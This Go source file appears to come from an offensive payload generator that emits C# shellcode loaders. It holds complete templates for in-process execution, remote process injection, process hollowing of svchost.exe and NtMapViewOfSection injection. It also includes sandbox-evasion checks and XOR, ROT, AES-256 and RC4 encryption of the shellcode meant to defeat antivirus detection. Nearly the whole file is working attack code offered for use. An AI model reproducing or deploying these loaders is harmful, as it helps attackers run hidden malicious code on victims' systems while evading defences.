package payloads

import (
	"bytes"
	"fmt"
	"log"
	"text/template"

	"github.com/Zerx0r/dvenom/internal/cryptor"
	"github.com/Zerx0r/dvenom/internal/helpers"
)

func csharpMain() string {
	return `
namespace Load {
	public class Program
	{
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
		uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		private static extern IntPtr GetCurrentProcess();
		[DllImport("Kernel32.dll")]
		public static extern uint FlsAlloc(IntPtr lpCallback);

		public static void Main(string[] args)
		{
			var mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
			if (mem == null)
			{
				return;
			}
			var result = FlsAlloc(IntPtr.Zero);
			if(result == 0xFFFFFFFF)
			{
				return;
			}

			byte[] buf  = new byte[] { {{.Values.ShellCode}} };

			{{.Values.DecodeFunc}}
			{{.Values.LoaderFunc}}
		}
	}
	{{.Values.LoaderClass}}
	{{ if .Values.CryptoClass }} {{.Values.CryptoClass}} {{end}}
}
`
}
func csharpShellCodeLoader() string {
	return `
public static class PayLoader
{
	public const uint PERW = 0x40;
	public const uint RES = 0x3000;
	public const int INF = -1;
	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr llpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

	[DllImport("kernel32.dll")]
	static extern IntPtr WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);

	public static IntPtr PayLocate(int size)
	{
		return VirtualAlloc(IntPtr.Zero, size, RES, PERW);
	}
	public static void PayCopy(byte[] src, IntPtr des)
	{
		Marshal.Copy(src, 0, des, src.Length);
	}
	public static IntPtr PayCreate(IntPtr location)
	{
		return CreateThread(IntPtr.Zero, 0, location, IntPtr.Zero, 0, 0);
	}
	public static void PayObject(IntPtr paymentObject)
	{
		WaitForSingleObject(paymentObject, INF);
	}
}
	`
}
func csharpShellcodeLoaderFunc() string {
	return `
	IntPtr location = PayLoader.PayLocate(buf.Length);
	PayLoader.PayCopy(buf, location);
	PayLoader.PayObject(PayLoader.PayCreate(location));
	`
}
func csharpProcessInjection() string {
	return `
public static class PayInject
{
	public static uint All = 0x001F0FFF;
	public static uint ComRes = 0x3000;
	public static uint PERW = 0x40;


	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
	uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);
	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	private static extern IntPtr GetCurrentProcess();

	public static IntPtr IsPayable()
	{

		return VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, ComRes, 0x4, 0);
	}
	public static IntPtr GetPayOpen(string proc)
	{
		Process[] expProc = Process.GetProcessesByName(proc);
		int pid = expProc[0].Id;
		return OpenProcess(All, false, pid);
	}
	public static IntPtr GetPayLocate(IntPtr handle)
	{
		return VirtualAllocEx(handle, IntPtr.Zero, 0x1000, ComRes, PERW);

	}
	public static void GetPayWrite(IntPtr payOpen, IntPtr payLocate, byte[] src)
	{
		WriteProcessMemory(payOpen, payLocate, src, src.Length, out IntPtr outSide);
	}
	public static void PayRemote(IntPtr payOpen, IntPtr payLocate)
	{
		CreateRemoteThread(payOpen, IntPtr.Zero, 0, payLocate, IntPtr.Zero, 0, IntPtr.Zero);
	}
}
	`
}
func csharpProcessInjectionFunc(procName string) string {
	str := `
	string processName = "%s";
	IntPtr payOpen = PayInject.GetPayOpen(processName);
	IntPtr PayLocate = PayInject.GetPayLocate(payOpen);
	PayInject.GetPayWrite(payOpen, PayLocate, buf);
	PayInject.PayRemote(payOpen, PayLocate);
	`
	return fmt.Sprintf(str, procName)
}

func csharpHollow() string {
	return `
public static class Hollow
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
	struct STARTUPINFO
	{
		public Int32 cb;
		public IntPtr lpReserved;
		public IntPtr lpDesktop;
		public IntPtr lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	[StructLayout(LayoutKind.Sequential)]
	internal struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}
	[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
	static extern bool CreateProcess(
		string lpApplicationName,
		string lpCommandLine,
		IntPtr lpProcessAttributes,
		IntPtr lpThreadAttributes,
		bool bInheritHandles,
		uint dwCreationFlags,
		IntPtr lpEnvironment,
		string lpCurrentDirectory,
		[In] ref STARTUPINFO lpStartupInfo,
		out PROCESS_INFORMATION lpProcessInformation);
	[StructLayout(LayoutKind.Sequential)]
	internal struct PROCESS_BASIC_INFORMATION
	{
		public IntPtr Reserved1;
		public IntPtr PebAddress;
		public IntPtr Reserved2;
		public IntPtr Reserved3;
		public IntPtr UniquePid;
		public IntPtr MoreReserved;
	}
	[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern int ZwQueryInformationProcess(
		IntPtr hProcess,
		int procInformationClass,
		ref PROCESS_BASIC_INFORMATION procInformation,
		uint ProcInfoLen,
		ref uint retlen);

	[DllImport("kernel32.dll", SetLastError = true)]
	static extern bool ReadProcessMemory(
		IntPtr hProcess,
		IntPtr lpBaseAddress,
		[Out] byte[] lpBuffer,
		int dwSize,
		out IntPtr lpNumberOfBytesRead);
	[DllImport("kernel32.dll")]
	static extern bool WriteProcessMemory(
		IntPtr hProcess,
		IntPtr lpBaseAddress,
		byte[] lpBuffer,
		Int32 nSize,
		out IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint ResumeThread(IntPtr hThread);
	public static void Start(byte[] buf)
	{
		STARTUPINFO startInfo = new STARTUPINFO();
		PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
		CreateProcess(null, "c:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref startInfo, out processInfo);
		PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();

		uint retLen = 0;
		IntPtr processHandle = processInfo.hProcess;
		ZwQueryInformationProcess(processHandle, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref retLen);

		IntPtr imageBaseOffset = (IntPtr)((Int64)basicInfo.PebAddress + 0x10);

		byte[] imageBaseBuffer = new byte[IntPtr.Size];
		ReadProcessMemory(processHandle, imageBaseOffset, imageBaseBuffer, imageBaseBuffer.Length, out _);

		IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(imageBaseBuffer, 0));

		byte[] headerBuffer = new byte[0x200];
		ReadProcessMemory(processHandle, imageBaseAddress, headerBuffer, headerBuffer.Length, out _);

		uint elfanewOffset = BitConverter.ToUInt32(headerBuffer, 0x3C);
		uint optHeader = elfanewOffset + 0x28;
		uint entryPoint = BitConverter.ToUInt32(headerBuffer, (int)optHeader);
		IntPtr entryPointAddress = (IntPtr)(entryPoint + (UInt64)imageBaseAddress);

		WriteProcessMemory(processHandle, entryPointAddress, buf, buf.Length, out _);
		ResumeThread(processInfo.hThread);
	}
}
	`
}

func csharpHollowFunc() string {
	return `
	Hollow.Start(buf);
	`
}

func csharpNtInject() string {
	return `
public static class NtInject
{
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr GetCurrentProcess();

	[DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
	static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

	[DllImport("ntdll.dll", SetLastError = true)]
	static extern uint NtMapViewOfSection(
	IntPtr SectionHandle,
	IntPtr ProcessHandle,
	ref IntPtr BaseAddress,
	UIntPtr ZeroBits,
	UIntPtr CommitSize,
	out ulong SectionOffset,
	out uint ViewSize,
	uint InheritDisposition,
	uint AllocationType,
	uint Win32Protect);

	[DllImport("ntdll.dll", SetLastError = true)]
	static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
	static extern int NtClose(IntPtr hObject);

	[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

	[DllImport("kernel32.dll")]
	static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
	public static void Start(byte[] buf, string processName)
	{
		IntPtr sectionHandle = IntPtr.Zero;
		UInt32 maximumSize = 4096;
		IntPtr localSectionAddress = IntPtr.Zero;
		IntPtr remoteSectionAddress = IntPtr.Zero;
		int pid = Process.GetProcessesByName(processName)[0].Id;
		NtCreateSection(ref sectionHandle, 0xe, IntPtr.Zero, ref maximumSize, 0x40, 0x8000000, IntPtr.Zero);
		NtMapViewOfSection(sectionHandle, GetCurrentProcess(), ref localSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out _, out _, 2, 0, 0x04);
		
		IntPtr targetProcess = OpenProcess(0x001F0FFF, false, pid);
		NtMapViewOfSection(sectionHandle, targetProcess, ref remoteSectionAddress, UIntPtr.Zero, UIntPtr.Zero, out _, out _, 2, 0, 0x20);

		Marshal.Copy(buf, 0, localSectionAddress, buf.Length);

		NtUnmapViewOfSection(GetCurrentProcess(), localSectionAddress);
		NtClose(sectionHandle);

		CreateRemoteThread(targetProcess, IntPtr.Zero, 0, remoteSectionAddress, IntPtr.Zero, 0, IntPtr.Zero);
	}
}
	`
}

func csharpNtInjectFunc(procName string) string {
	str := `
	NtInject.Start(buf, "%s");
	`
	return fmt.Sprintf(str, procName)
}

func csharpAES256Class() string {
	return `
public static class Crypto
{
	public static byte[] Decrypt(byte[] input, byte[] key, byte[] iv)
	{
		using (Aes aes = Aes.Create())
		{
			aes.Key = key;
			aes.IV = iv;
			using (var decryptor = aes.CreateDecryptor())
			{
				using (var ms = new System.IO.MemoryStream())
				{
					using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))
					{
						cs.Write(input, 0, input.Length);
					}
					return ms.ToArray();
				}
			}
		}
	}
}
	`
}

func csharpRC4Class() string {
	return `
public static class Crypto
{
	public static byte[] Decrypt(byte[] input, byte[] key)
	{
		byte[] buf = new byte[input.Length];
		int i = 0, j = 0;

		int[] perm = new int[256];
		for (int k = 0; k < 256; k++)
		{
			perm[k] = k;
		}

		for (int k = 0; k < 256; k++)
		{
			j = (j + perm[k] + key[k % key.Length]) % 256;
			int temp = perm[k];
			perm[k] = perm[j];
			perm[j] = temp;
		}

		i = j = 0;
		for (int k = 0; k < input.Length; k++)
		{
			i = (i + 1) % 256;
			j = (j + perm[i]) % 256;
			int temp = perm[i];
			perm[i] = perm[j];
			perm[j] = temp;
			int t = (perm[i] + perm[j]) % 256;
			buf[k] = (byte)(input[k] ^ perm[t]);
		}

		return buf;
	}
}
	`
}

func csharpXor(xorKey string) string {
	str := `
	string key = "%s";
	for (int i = 0; i < buf.Length; i++)
	{
		buf[i] = (byte)(buf[i] ^ (byte)key[i %% key.Length]);
	}
	`

	return fmt.Sprintf(str, xorKey)
}

func csharpRot(rotKey string) string {
	str := `
	for (int i = 0; i < buf.Length; i++)
	{
		buf[i] = (byte)(((uint)buf[i] - %s) & 0xFF);
	}
	`

	return fmt.Sprintf(str, rotKey)
}

func csharpAES256(key, iv []byte) string {
	str := `
	byte[] key = new byte[] { %s };
	byte[] iv = new byte[] { %s };
	buf = Crypto.Decrypt(buf, key, iv);
	`
	return fmt.Sprintf(str, helpers.BytesToHexArray(key), helpers.BytesToHexArray(iv))
}

func csharpRC4(key []byte) string {
	str := `
	byte[] key = new byte[] { %s };
	buf = Crypto.Decrypt(buf, key);
	`
	return fmt.Sprintf(str, helpers.BytesToHexArray(key))
}

func BuildCsharpTemplate(methodType string, cipherType string, key string, procName string, shellCode []byte) string {

	field := helpers.Field{
		Values: make(map[string]string),
	}
	var value []byte
	var err error
	switch cipherType {
	case "xor":
		value = cryptor.Xor(key, shellCode)
		field.SetValue("DecodeFunc", csharpXor(key))
	case "rot":
		value = cryptor.Rot(key, shellCode)
		field.SetValue("DecodeFunc", csharpRot(key))
	case "aes256":
		var iv []byte
		value, iv, err = cryptor.Aes256([]byte(key), shellCode)
		if err != nil {
			log.Fatal("[x] Error: Aes256 encryption failed.", err)
		}
		field.SetValue("DecodeFunc", csharpAES256([]byte(key), iv))
		field.SetValue("CryptoClass", csharpAES256Class())
	case "rc4":
		value, err = cryptor.Rc4([]byte(key), shellCode)
		if err != nil {
			log.Fatal("[x] Error: RC4 encryption failed.", err)
		}
		field.SetValue("DecodeFunc", csharpRC4([]byte(key)))
		field.SetValue("CryptoClass", csharpRC4Class())
	default:
		log.Fatalf("[x] Error: Cipher type %s is not supported with cs payload. Supported types: (xor, rot, aes256, rc4)", cipherType)
	}
	switch methodType {
	case "valloc":
		field.SetValue("LoaderClass", csharpShellCodeLoader())
		field.SetValue("LoaderFunc", csharpShellcodeLoaderFunc())
	case "pinject":
		field.SetValue("LoaderClass", csharpProcessInjection())
		field.SetValue("LoaderFunc", csharpProcessInjectionFunc(procName))
	case "hollow":
		field.SetValue("LoaderClass", csharpHollow())
		field.SetValue("LoaderFunc", csharpHollowFunc())
	case "ntinject":
		field.SetValue("LoaderClass", csharpNtInject())
		field.SetValue("LoaderFunc", csharpNtInjectFunc(procName))
	default:
		log.Fatalf("[x] Error: Method type %s is not supported in cs payload. Supported types: (valloc, pinject, hollow, ntinject)", methodType)
		return ""
	}
	field.SetValue("ShellCode", helpers.BytesToHexArray(value))

	return buildCsharpTemplate(field, csharpMain())
}

func buildCsharpTemplate(field helpers.Field, vbaTemplate string) string {
	var buffer bytes.Buffer
	t, err := template.New("CsharpTemplate").Parse(vbaTemplate)
	if err != nil {
		log.Fatal("[x] Error: Failed to generate cs code.", err)
	}

	if err := t.Execute(&buffer, field); err != nil {
		log.Fatal("[x] Error: Failed to generate cs code.", err)
	}
	return buffer.String()
}
